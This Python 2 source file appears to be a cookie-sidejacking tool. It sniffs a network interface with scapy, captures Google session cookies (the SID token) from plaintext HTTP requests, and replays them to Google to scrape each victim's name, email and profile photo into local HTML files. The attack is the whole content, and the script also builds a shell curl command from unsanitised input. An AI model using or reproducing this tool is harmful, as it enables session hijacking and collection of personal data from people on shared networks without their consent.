from bs4 import BeautifulSoup
import copy
import dpkt
import requests
import sys
import threading

# necessary for accessing libdnet from within a virtualenv on OSX
if sys.platform == "darwin":
  import site; site.addsitedir("/usr/local/lib/python2.7/site-packages")

from scapy.all import *

session_ids =set() # a global set for all session ids
user_packet ={}
user_complete = {}
user_start = {}
counter = 0

def subprocess_cmd(command):
    process = subprocess.Popen(command,stdout=subprocess.PIPE, shell=True)
    proc_stdout = process.communicate()[0].strip()

def extract_google_stok(cookie):
	session_tok = None;
	cookie_toks = cookie.split(": ")[1].split("; ")
	for i in cookie_toks:
		if i[0:4].lower() == "sid=":
			session_tok = i.split("SID=")[1]
			break
	if session_tok == None: #no session cookie found
		return None
	else:
		return session_tok

def make_request(cookie, user_ip):

	url = 'http://www.google.com/?gws_rd=ssl'
	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
	add_headers["Cookie"] = cookie
	r = requests.get(url, headers=add_headers)
	resp = r.content
	soup = BeautifulSoup(resp, 'html.parser')
	name_div = soup.findAll("div", { "class" : "gb_Cb"})
	name = name_div[0].text
	email_div = soup.findAll("div", { "class" : "gb_Db"})
	email = email_div[0].text.split(" ")[0]
	usr_img = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s500")
	img_file = user_ip.split(":")[0].replace(".","")+".jpg"


	f = open("./client_files/"+user_ip.split(":")[0].replace(".","")+".html", "w")
	f.write(name+"<br><br><br>")
	f.write(email+"<br><br><br>")
	f.write("<img src=\""+img_file+"\" alt=\"Smiley face\" height=\"42\" width=\"42\">")
	subprocess_cmd("curl "+usr_img+" > ./client_files/"+img_file)
	f.close()
	# subprocess_cmd("echo "+name+" > ./"+user_ip.split(":")[0]+"/name.txt")
	# subprocess_cmd("echo "+email+" > ./"+user_ip.split(":")[0]+"/email.txt")

def extract_cookie(packet):

	counter = counter+1
	# provide access to globar variables
	global counter
	global session_ids
	global user_packet
	global user_complete
	global user_start

	s_tok = None
	cur_packet = None

	dest_port = packet.sprintf("{TCP:%TCP.dport%}")

	if dest_port != 'http': #fiter all all other traffic http traffic			
		return
	else:
		ip_src=packet.sprintf("{IP:%IP.src%}")
		p_src=packet.sprintf("{TCP:%TCP.sport%}")
		user_key = ip_src+":"+p_src
		x = packet.sprintf("{Raw:%Raw.load%}")[1:-1]

		#create an entry for a user tuple
		if 'GET /' in x and "host: www.google.com" in x.lower() and user_key not in user_packet:
			user_packet[user_key] =	 None
			user_complete[user_key] = 0

		#update packet collection for each individual stream
		if user_key in user_packet and '\\r\\n\\r\\n' in x and user_key not in user_start:

			cur_packet = copy.deepcopy(x)
			user_packet[user_key] = cur_packet
			user_complete[user_key] = 1

		elif user_key in user_packet and '\\r\\n\\r\\n' not in x and user_key not in user_start:
			cur_packet = copy.deepcopy(x)
			user_packet[user_key] =  cur_packet
			user_start[user_key] = 1

		elif user_key in user_packet and user_key in user_start and  user_complete[user_key] == 0:
			cur_packet = copy.deepcopy(x)
			user_packet[user_key] =  user_packet[user_key] + cur_packet

			# if this was the last chunk of the packet
			if '\\r\\n\\r\\n' in cur_packet:
				packet_start = 0
				del user_start[user_key]
				user_complete[user_key] = 1

		#make a replay request once the packet is complete
		if user_key in user_complete:

			if user_complete[user_key] ==1 and "cookie" in user_packet[user_key].lower():
				
			 	header_arr = user_packet[user_key].split("\\r\\n")
			 	for field  in header_arr:
					if "cookie: "in field.lower(): #if cookie is found in the header
			 			cookie_str = field
						s_tok = extract_google_stok(field)
						break

				if s_tok not in session_ids and s_tok != None:
		  			session_ids.update([s_tok])
		 			temp_cookie = cookie_str.split(": ")[1].replace("\r\n","\\r\\n")

		 			thread = threading.Thread(target=make_request, args=(temp_cookie, user_key))
					thread.daemon = True                     
					thread.start()

				if user_complete[user_key] == 1:
					del user_complete[user_key]
					del	user_packet[user_key]

def main():

	subprocess_cmd("mkdir 777 client_files") #create dir for storing files
	interface = sys.argv[1]
	print interface
	sniff(iface=interface, prn=extract_cookie)
if __name__ == '__main__':
	main()
	
